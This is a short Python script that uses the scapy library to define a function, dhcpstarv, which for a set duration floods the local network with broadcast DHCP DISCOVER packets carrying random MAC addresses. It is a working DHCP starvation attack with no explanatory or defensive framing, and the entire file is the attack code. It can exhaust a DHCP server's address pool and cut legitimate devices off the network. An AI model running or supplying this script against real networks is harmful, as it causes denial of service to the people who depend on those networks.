from scapy.all import *


def dhcpstarv(duration):
    conf.checkIPaddr = False
    start_time = time.time()
    end_time = start_time + duration

    while time.time() < end_time:
        DHCP_DISCOVER = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800) / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(dport=67,sport=68) /BOOTP(op=1, chaddr=RandMAC()) / DHCP(options=[("message-type","discover"), ("end")])
        sendp(DHCP_DISCOVER, loop=0, verbose=0)
